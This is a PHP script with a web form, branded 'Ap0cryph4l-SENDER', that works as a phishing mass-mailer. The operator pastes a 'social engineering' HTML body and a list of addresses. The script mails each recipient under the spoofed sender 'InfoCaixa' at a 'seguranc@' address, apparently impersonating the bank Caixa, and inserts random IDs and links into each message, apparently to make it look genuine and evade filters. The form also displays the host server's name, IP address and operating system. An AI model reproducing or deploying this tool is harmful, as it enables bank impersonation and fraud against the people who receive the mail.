<?php
$hostname = gethostname(); 
$testa = $_POST['veio'];
if($testa != "") {
	$message = $_POST['html'];
	$subject = $_POST['assunto'];
	$nome = $_POST['nome'];
	$de = $_POST['de'];
	$to = $_POST['emails']; 
	$quem = "InfoCaixa"; // So mudar nome aqui
	 $env = "seguranc@".$hostname; //So mudar o email aqui

	$email = explode("\n", $to);
	$message = stripslashes($message);

	
	function random_num(){
        for($x = 0; $x < 4; $x++){
        $n = $n . rand(1,9);
        }
         return mt_rand(1,2) . $n;
        }
		function email_rand_num(){
        for($x = 0; $x < 16; $x++){
        $n = $n . rand(1,9);
        }
         return mt_rand(1,2) . $n;
        }
		function random_link($tamanho) {
	$conteudo = "1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ";

	for($i=0;$i<$tamanho;$i++) {
		$string .= $conteudo{rand(0,35)};
	}

	return $string;
}
	$i = 0;
	$count = 1;
	while($email[$i]) {
    $dataHora = date("d/m/Y h:i:s");
	$boundary = rand(0,999999999);
	$codig  = " - [ id $boundary\n ]";	
$message = str_replace("%EMAILC%", $email[$i], $message);
	$exp = explode('@', $email[$i]);
	$message = str_replace("%EMAIL%", $exp[0], $message);
	$message = str_replace("%random_num%", random_num(), $message);
	$message = str_replace("%rand_link%", random_link(18), $message);
	$subject = str_replace("%EMAIL%", $email[$i], $subject);


		
                 $EmailTemporario = $email[$i];
                 $message = stripslashes($message);
		$headers  = "MIME-Version: 1.0\n";
        $headers .= "Content-type: text/html; charset=UTF-8\r\n";
		$headers .= "From: ".$quem." <".$env.">\r\n";
		
		
		
		if(mail($EmailTemporario, $subject.$codig, $message.$dataHora, $headers))
		echo "<font color=blue>* N&#1098;mero: $count <b>".$email[$i]."</b> <font color=black>VEM INFOOOOO....!</font><br><hr>";
		else
		echo "<font color=red>* N&#1098;mero: $count <b>".$email[$i]."</b> <font color=red>EROO NAO ENVIO</font><br><hr>";
		$i++;
		$count++;
	}
	$count--;
	echo "[Fim do Envio]";
	if($ok == "ok")
	echo "[Fim do Envio]"; 

}

?>



<HTML>
<head>
<title>Ap0cryph4l-SENDER</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<style>
table {
	background-image: url(https://i.imgur.com/58WwHud.jpg);
	
	background-repeat: no-repeat;
}
table {
	color
	
}
img {
	text-align: center;
}
</style></head>
<body style="">
       <table width="657" height="782" border="0" align="center">
  <tr>
   <form action="" method="post" enctype="multipart/form-data" name="form1">
    <td width="651" height="388"><p>
      <input type="hidden" name="veio" value="sim">
    </p>
      <p>&nbsp;</p>
      <p>
       <input name="assunto" placeholder="ASSUNTO" type="text"class="normal" id="assunto" style="width:40%" >

        <input type="submit" name="Submit" id="enviar" value="Enviar">
      </p>
      <p>&nbsp;</p>
      <p>&nbsp;</p>
      <p>&nbsp;</p>
      <p><textarea name="html" placeholder="ENGENHARIA EM HTML" style="width:100%" rows="8" wrap="VIRTUAL" class="normal" id="html">
</textarea>      
      <p>
        
        <textarea name="emails" style="width:100%" rows="8" wrap="VIRTUAL" class="normal" id="emails" placeholder="LIST"></textarea>
      <p>Ap0cryph4l DISPARADOR</p>
    <p>SERVER: <?php echo $UNAME = @php_uname(); ?><br>
      IP: <?php echo $_SERVER['SERVER_ADDR']; ?><br>
    O.S: <?php echo $OS = @PHP_OS; ?></p></tr>
  <tr>
    <td height="388">  
  </tr>
</table> 
 </body>
</html>